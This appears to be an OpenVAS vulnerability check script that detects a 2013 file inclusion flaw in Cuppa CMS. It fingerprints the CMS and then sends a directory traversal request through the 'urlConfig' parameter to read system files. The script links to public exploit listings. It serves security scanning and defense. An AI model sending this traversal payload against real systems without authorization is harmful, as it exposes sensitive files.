###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cuppa_cms_file_inclusion_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Cuppa CMS Remote/Local File Inclusion Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to read or include
  arbitrary files from the local system using directory traversal sequences
  on the target system.
  Impact Level: Application";

tag_affected = "Cuppa CMS beta version 0.1";
tag_insight = "Improper sanitation of user supplied input via 'urlConfig' parameter to
  'alerts/alertConfigField.php' script.";
tag_solution = "No solution or patch is available as of 11th, June 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.cuppacms.com";
tag_summary = "This host is installed with Cuppa CMS and is prone to file
  inclusion vulnerability.";

if(description)
{
  script_id(803805);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-06-06 10:36:14 +0530 (Thu, 06 Jun 2013)");
  script_name("Cuppa CMS Remote/Local File Inclusion Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://1337day.com/exploit/20855");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/25971");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121881/cuppacms-rfi.txt");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/cuppa-cms-remote-local-file-inclusion");

  script_description(desc);
  script_summary("Check if Cuppa CMS is vulnerable to file reading vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
url = "";
port = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/cuppa", "/cms", cgi_dirs()))
{
  ## Request for the search.cgi
  sndReq = http_get(item:string(dir, "/index.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  ## confirm the Application
  if(rcvRes && ">Cuppa CMS" >< rcvRes && "Username<" >< rcvRes)
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = dir + "/alerts/alertConfigField.php?urlConfig=" +
                  crap(data:"../",length:3*15) + files[file];

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        security_hole(port);
        exit(0);
      }
    }
  }
}
